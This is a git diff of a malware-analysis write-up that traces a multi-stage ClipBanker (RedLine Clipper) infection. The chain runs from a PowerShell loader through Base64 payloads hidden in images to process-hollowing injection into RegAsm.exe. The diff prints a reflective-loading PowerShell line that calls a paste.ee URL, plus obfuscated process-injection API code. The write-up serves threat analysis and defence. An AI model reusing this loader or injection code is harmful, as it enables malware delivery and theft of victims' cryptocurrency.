@@ -1,6 +1,6 @@
-## Multi Stage Redline Infostealer
+## Multi Stage ClipBanker Analysis
 
-RedLine Stealer is malware available on underground forums for sale. This malware harvests information from browsers such as saved credentials, autocomplete data, and credit card information. A system inventory is also taken when running on a target machine, to include details such as the username, location data, hardware configuration, and information regarding installed security software.
+RedLine Clipper (aka ClipBanker) is specifically designed to steal cryptocurrencies by replacing the user’s system clipboard activities with the wallet address under the control of attackers. 
 
 ## Initial JavaScript
 
@@ -75,6 +75,7 @@ $imageUrl = 'hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.j
 [System.Convert]::FromBase64String($base64Command);$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);$type = $loadedAssembly.GetType('ClassLibrary3.Class1');$method = $type.GetMethod('Run').Invoke($null, [object[]] ('0/iK75U/d/ee.etsap//:sptth' , '' , '2' , 'VbsName' , '1' , 'C:\ProgramData\',
 'LnkName'))
 ```
+## 3rd Stage - Some Executables
 
 There are 2 interesting URLs within this command block:
 
@@ -82,9 +83,9 @@ There are 2 interesting URLs within this command block:
 
 [-] hxxps[://]paste[.]ee/d/U57Ki/0
 
-For the first URL, it reads the bytes in between 2 flags present in the strings of an image file and executes them.
+For the first URL, it reads the bytes between 2 flags present in the strings of an image file and executes them. The 2nd URL is passed as an argument - which will make more sense later.
 
-We can extract this too by downloading the image, running a strings command, and extracting the code between the <<BASE64_START>> and <<BASE64_END>> flags.
+We can extract the contents of the first by downloading the image, running a strings command, and extracting the code between the <<BASE64_START>> and <<BASE64_END>> flags.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/87dd46b6-366f-44d2-8768-9c26fae6b070)
 
@@ -94,11 +95,47 @@ When decoding this from Base64 we are given an executable file.
 
 The second URL contains a reversed Base64 string which contains another executable.
 
-1st Executable SHA 256: e7e22e5e0f47fe2c2aa71f293e609c4fac901823dce6c6ae39400d1c2f02df54
+**1st Executable SHA 256**: e7e22e5e0f47fe2c2aa71f293e609c4fac901823dce6c6ae39400d1c2f02df54
 
-2nd Executable SHA 256: 8c21274f725299022fbf415925210da65702198913c4713dfe5dda09ceb2d38a
+**2nd Executable SHA 256**: 8c21274f725299022fbf415925210da65702198913c4713dfe5dda09ceb2d38a
 
+The first executable appears to be a generic loader / malware deployment framework.
 
+Within the first line after the entry point, we can see the variable 'LAbWJK' which is the name given to the 2nd executable, as it was given as an argument in the previous PowerShell command.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/74401b9a-3d72-4a46-8ecc-ccf43619ed47)
+
+Moving down, there are references to generic persistence mechanisms, which in this case, have not been enabled. 
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/071802e4-6b24-48e3-ad53-319043036be8)
+
+Next, we can see more Base64 content being extracted from an image, reversed, and executed.
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fe9c374a-5c80-4d55-870e-77a7635ef61f)
+
+After reversing the string, downloading the image, reversing the base64 and decoding to an executable, we are presented with a binary whose sole purpose is to inject code.
+
+**References to Injection:**
+``` powershell
+private static readonly Class1.Delegate9 delegate9_0 = Class1.smethod_0<Class1.Delegate9>("kern!".Replace("!", "el32"), "Create&".Replace("&", "ProcessA"));
+private static readonly Class1.Delegate8 delegate8_0 = Class1.smethod_0<Class1.Delegate8>("%ll".Replace("%", "ntd"), "#ewOfSection".Replace("#", "ZwUnmapVi"));
+private static readonly Class1.Delegate7 delegate7_0 = Class1.smethod_0<Class1.Delegate7>("kern!".Replace("!", "el32"), "!ssMemory".Replace("!", "ReadProce"));
+private static readonly Class1.Delegate6 delegate6_0 = Class1.smethod_0<Class1.Delegate6>("kern!".Replace("!", "el32"), "WritePro@".Replace("@", "cessMemory"));
+private static readonly Class1.Delegate5 delegate5_0 = Class1.smethod_0<Class1.Delegate5>("kern!".Replace("!", "el32"), "qllocEx".Replace("q", "VirtualA"));
+private static readonly Class1.Delegate4 delegate4_0 = Class1.smethod_0<Class1.Delegate4>("kern!".Replace("!", "el32"), "#ontext".Replace("#", "GetThreadC"));
+private static readonly Class1.Delegate2 delegate2_0 = Class1.smethod_0<Class1.Delegate2>("kern!".Replace("!", "el32"), "+adContext".Replace("+", "SetThre"));
+private static readonly Class1.Delegate1 delegate1_0 = Class1.smethod_0<Class1.Delegate1>("kern!".Replace("!", "el32"), "Wow64Set%".Replace("%", "ThreadContext"));
+private static readonly Class1.Delegate0 delegate0_0 = Class1.smethod_0<Class1.Delegate0>("kern!".Replace("!", "el32"), "@Thread".Replace("@", "Resume"));
+```
+
+Following this, we can see that 'LAbWJK' - our 2nd executable - is being injected into RegAsm.exe
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/11a435b8-b82e-4d19-b4a0-7f91dcea8088)
+
+The 2nd executable is our main payload, which is ClipBanker Malware.
+
+Within the binary there are references to the attacker's wallet addresses:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/3313d627-d9db-4b98-b3b2-0be9cfac69bf)
 
 
 
